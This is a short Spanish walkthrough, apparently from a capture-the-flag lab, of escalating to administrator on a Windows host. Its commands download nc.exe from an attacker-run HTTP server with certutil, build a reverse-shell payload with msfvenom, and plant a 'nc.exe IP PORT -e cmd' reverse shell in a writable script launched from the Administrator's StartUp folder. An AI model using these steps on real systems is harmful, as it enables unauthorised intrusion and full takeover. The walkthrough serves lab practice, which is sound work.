Root.txt

Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.

Miramos nuestros prvilegios:
    - whoami /all
    - net user username
Pero no hay nada util, miramos los puertos, procesos, posibles servicios internos, etc. Pero nada.

Miramos ahora la start folder:
    - cd  C:\Users\Administrador\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\

Hay un archivo. Este archivo se ejecuta cada vez que un usuario inicia sesion. Miramos su contenido, y vemos que ejecuta otro archivo. Vamos al directorio de ese otro archivo.
Por suerte podemos ver su contenido, aunque no es relevante los comandos que ejecuta, miramo si podemos añadir informacion:
    echo "#hola"

y si hemos podido, quiere decir que tenemos privilegios de escritura.
Vamos a intentar ejecutar un nc.

Nos descargamos el nc.exe:
    - En nuestro PC -> python3 -m http.server
    - certutil -urlcache -split -f http://IP:PORT/nc.exe
Si no tenemos el nc.exe, podemos crearnos uno con msfvenom:
    - msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=nuestra_IP LPORT=PORT -f exe > nc.exe

Añadimos el comando al fichero:
    - write-output "path\nc.exe IP PORT -e cmd" | set-content link.ps1
